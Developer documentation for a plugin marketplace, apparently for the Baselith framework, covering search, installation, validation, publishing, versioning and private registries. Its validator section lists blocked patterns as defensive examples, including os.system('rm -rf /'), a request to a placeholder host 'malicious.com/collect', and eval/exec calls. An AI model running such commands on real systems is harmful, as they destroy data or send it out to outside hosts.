---
title: Marketplace
description: Publish and distribute plugins
---



The **Plugin Marketplace** is the ecosystem for distributing, discovering, and installing plugins. It enables developers to share extensions and allows users to enrich their system with verified additional capabilities.

!!! info "Marketplace Objectives"
    - **Developers**: Distribute plugins to a wide audience.
    - **Users**: Find and install verified plugins with a single click.
    - **Organizations**: Share internal plugins via a private registry.

!!! tip "CLI First"
    While a Python API is available, most users find the **CLI Marketplace Commands** provide the most efficient and robust way to manage plugins. Use `baselith plugin search/install` for your daily operations.

---

## Architecture

The Marketplace system consists of three primary components:

```mermaid
flowchart LR
    subgraph Developer["Developer"]
        D1[Plugin Source]
        D2[Package Command]
    end
    
    subgraph Registry["Plugin Registry"]
        R1[(Package Storage)]
        R2[Metadata Index]
        R3[Security Scanner]
    end
    
    subgraph User["User System"]
        U1[Installer]
        U2[Plugin Manager]
        U3[Running Plugins]
    end
    
    D1 --> D2
    D2 --> R1
    R1 --> R2
    R1 --> R3
    
    U1 --> R2
    R2 --> U1
    U1 --> U2
    U2 --> U3
```

| Component     | Module                             | Function                             |
| :------------ | :--------------------------------- | :----------------------------------- |
| **Registry**  | `core/marketplace/registry.py`     | Centralized plugin catalog           |
| **Installer** | `core/marketplace/installer.py`    | Download and installation management |
| **Validator** | `core/marketplace/validator.py`    | Security and structure validation    |
| **Publisher** | `plugins/marketplace/publisher.py` | Publishing and update logic          |

---

## CLI Management

The most common way to interact with the Plugin Marketplace is through the Baselith CLI. It provides a set of high-level commands to manage the entire plugin lifecycle.

### Quick Start

```bash
# 1. Search for a plugin
baselith plugin search agent

# 2. Get details
baselith plugin info weather-agent

# 3. Install
baselith plugin install weather-agent

# 4. Check for updates
baselith plugin update weather-agent
```

---

## Registry

The Registry is the centralized catalog where plugins are published and indexed.

### Searching for Plugins

```python
from core.marketplace import PluginRegistry

registry = PluginRegistry()

# Search plugins by keyword
results = await registry.search(
    query="weather",           # Keywords
    category="utility",        # Category (optional)
    min_rating=4.0,            # Minimum rating (optional)
    verified_only=True         # Only verified plugins
)

for plugin in results:
    print(f"{plugin.name} v{plugin.version}")
    print(f"  Downloads: {plugin.downloads}")
    print(f"  Rating: {plugin.rating}/5")
    print(f"  Author: {plugin.author}")
```

### Plugin Details

```python
# Get complete information about a plugin
plugin_info = await registry.get("weather-agent")

print(f"Name: {plugin_info.name}")
print(f"Description: {plugin_info.description}")
print(f"Version: {plugin_info.version}")
print(f"Downloads: {plugin_info.downloads}")
print(f"Rating: {plugin_info.rating}")
print(f"Updated: {plugin_info.updated_at}")
print(f"Dependencies: {plugin_info.dependencies}")
print(f"Min Framework Version: {plugin_info.min_framework_version}")

# Version changelog
for version in plugin_info.versions:
    print(f"  {version.number}: {version.summary}")
```

### Available Categories

| Category        | Description             | Examples                       |
| :-------------- | :---------------------- | :----------------------------- |
| `utility`       | General tools           | Weather, Calculator, Converter |
| `integration`   | External integrations   | Slack, Jira, Salesforce        |
| `ai`            | AI/LLM extensions       | Custom agents, RAG systems     |
| `security`      | Security and auditing   | Threat detection               |
| `analytics`     | Analysis and reporting  | Dashboards, Metrics            |
| `communication` | Notifications/Messaging | Telegram, Email, SMS           |

---

## Installer

The Installer manages the download, verification, and installation of plugins.

### Basic Installation

```python
from core.marketplace import PluginInstaller

installer = PluginInstaller()

# Install the latest stable version
await installer.install("weather-agent")

# Install a specific version
await installer.install("weather-agent@1.2.0")

# Install with dependencies
await installer.install("weather-agent", with_dependencies=True)
```

### Updating Plugins

```python
# Update a single plugin
await installer.update("weather-agent")

# Update all installed plugins
updates = await installer.check_updates()
for plugin, new_version in updates:
    print(f"Updating {plugin.name} from {plugin.version} to {new_version}")
    await installer.update(plugin.name)
```

### Uninstallation

```python
# Remove a plugin
await installer.uninstall("weather-agent")

# Remove plugin and clean up data
await installer.uninstall("weather-agent", cleanup_data=True)
```

### Dependency Management

```python
# Resolve dependencies before installation
deps = await installer.resolve_dependencies("complex-plugin")

print("Will install:")
for dep in deps:
    print(f"  - {dep.name} v{dep.version}")

# Confirm and install
await installer.install("complex-plugin", with_dependencies=True)
```

---

## Validator

The Validator performs security checks and structural validation before publication to ensure ecosystem safety.

### Local Validation

Always validate your plugin locally before attempting to publish.

```python
from core.marketplace import PluginValidator

validator = PluginValidator()

# Validate structure and security
result = await validator.validate("plugins/my-plugin/")

if result.is_valid:
    print("✅ Plugin is valid, ready for publication")
else:
    print("❌ Plugin is invalid:")
    for error in result.errors:
        print(f"  - {error.severity}: {error.message}")
        print(f"    File: {error.file}:{error.line}")
```

### Automated Checks

The validator runs a series of automated checks:

| Check            | Type     | Description                                    |
| :--------------- | :------- | :--------------------------------------------- |
| **Structure**    | Required | Mandatory files and directories must exist     |
| **Metadata**     | Required | `manifest.json` must be valid and complete     |
| **Imports**      | Security | No imports of dangerous modules                |
| **System Calls** | Security | No `os.system()`, `subprocess`, etc.           |
| **Network**      | Security | Detection of calls to suspicious IPs/hosts     |
| **Dependencies** | Compat   | Dependencies must be compatible with framework |
| **Syntax**       | Quality  | Python code must be syntactically correct      |
| **Types**        | Quality  | Presence of type hints (recommended)           |

### Detected Dangerous Patterns

```python
# ❌ These patterns will cause validation failure:

import subprocess  # Blocked: Shell access
import os
os.system("rm -rf /")  # Blocked: System command

import requests
requests.get("http://malicious.com/collect")  # Warning: Suspicious URL

eval(user_input)  # Blocked: Code execution
exec(code)  # Blocked: Code execution

__import__("dangerous")  # Blocked: Dynamic import
```

---

## Publishing

Follow this workflow to publish a plugin to the Marketplace.

### 1. Preparation

Ensure your plugin directory has all required files:

```text
my-plugin/
├── plugin.py           # Entry point (Required)
├── manifest.json       # Metadata (Required)
├── README.md           # Documentation (Required)
├── CHANGELOG.md        # Version history
├── requirements.txt    # Python dependencies
└── tests/              # Test suite (Recommended)
```

### 2. Configure `manifest.json`

```json title="manifest.json"
{
  "name": "my-awesome-plugin",
  "version": "1.0.0",
  "description": "A plugin that does incredible things",
  "author": "Your Name <you@example.com>",
  "license": "MIT",
  "homepage": "https://github.com/you/my-plugin",
  "repository": "https://github.com/you/my-plugin",
  "keywords": ["example", "demo", "utility"],
  "category": "utility",
  "min_framework_version": "1.0.0",
  "dependencies": {
    "python": ["httpx>=0.25", "pydantic>=2.0"],
    "plugins": ["base-utilities@^1.0"]
  },
  "capabilities": ["agent", "router"]
}
```

### 3. Validation

```bash
# Validate before publishing
baselith plugin validate my-plugin
```

### 4. Packaging

```bash
# Create a distributable package
baselith plugin package my-plugin --output dist/
```

**Output:**

```text
✅ Validating plugin...
✅ Running tests...
✅ Building package...
✅ Package created: dist/my-awesome-plugin-1.0.0.tar.gz
```

### 5. Publishing

```bash
# Publish to the registry
baselith plugin publish my-plugin \
  --registry https://registry.example.com \
  --api-key YOUR_API_KEY
```

**Output:**

```text
✅ Uploading package...
✅ Verifying signature...
✅ Running security scan...
✅ Indexing metadata...
✅ Published: my-awesome-plugin v1.0.0

View at: https://registry.example.com/plugins/my-awesome-plugin
```

---

## Versioning

Use **Semantic Versioning** (SemVer):

| Type      | Format | When                                  |
| :-------- | :----- | :------------------------------------ |
| **MAJOR** | X.0.0  | Breaking changes, API incompatibility |
| **MINOR** | x.Y.0  | New backward-compatible features      |
| **PATCH** | x.y.Z  | Bug fixes, minor patches              |

**Examples:**

- `1.0.0` -> `1.0.1`: Bug fix
- `1.0.0` -> `1.1.0`: New feature
- `1.0.0` -> `2.0.0`: API change

### Pre-release

```json
{
  "version": "2.0.0-beta.1"
}
```

Pre-release versions are not installed by default.

---

## Deprecation Policy

When deprecating a plugin or version:

### 1. Mark as Deprecated

```bash
baselith plugin deprecate my-plugin@1.0.0 \
  --reason "Security vulnerability fixed in 1.0.1" \
  --alternative "my-plugin@1.0.1"
```

### 2. Recommended Timeline

| Phase            | Duration | Action                             |
| :--------------- | :------- | :--------------------------------- |
| **Announcement** | T+0      | Deprecation notice published       |
| **Warning**      | +30 days | Warning during installation        |
| **Soft Block**   | +60 days | Requires `--allow-deprecated` flag |
| **Removal**      | +90 days | Removal from registry              |

### 3. Communication

The system automatically notifies users who have installed deprecated versions.

---

## Private Registry

For organizations requiring an internal registry:

### Setup

```bash
# Docker compose for private registry
docker compose -f docker-compose.registry.yml up -d
```

### Client Configuration

```env
PLUGIN_REGISTRY_URL=https://internal-registry.company.com
PLUGIN_REGISTRY_API_KEY=internal-api-key
```

### Internal Publishing

```bash
baselith plugin publish my-internal-plugin \
  --registry https://internal-registry.company.com
```

---

## Best Practices

!!! tip "Comprehensive README"
    Always include: description, installation, configuration, examples, and troubleshooting.

!!! tip "Changelog"
    Maintain an up-to-date `CHANGELOG.md` for every release.

!!! warning "Security"
    Never include API keys, passwords, or secrets in the plugin code. Always use external configuration.

!!! tip "Testing"
    Include a test suite. Plugins with tests receive higher ratings and more downloads.

!!! tip "Versioning"
    Strictly follow SemVer. Breaking changes **require** a major version bump.
